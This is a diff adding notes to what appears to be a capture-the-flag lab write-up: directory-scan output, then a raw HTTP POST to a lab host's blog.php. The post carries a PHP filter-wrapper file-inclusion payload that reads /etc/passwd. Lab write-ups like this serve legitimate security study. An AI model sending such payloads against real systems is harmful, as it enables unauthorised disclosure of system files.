@@ -113,3 +113,20 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /server-status        (Status: 403) [Size: 278] 
 </code>
 
+
+POST /blog.php HTTP/1.1
+Host: 10.10.212.216
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+Origin: http://10.10.212.216
+Connection: close
+Referer: http://10.10.212.216/blog.php
+Cookie: PHPSESSID=h4l1in63129r4umoejfqv5883b
+Upgrade-Insecure-Requests: 1
+
+delete=Delete&comment=php://filter/convert.base64-encode/resource=/etc/passwd&file=test
+
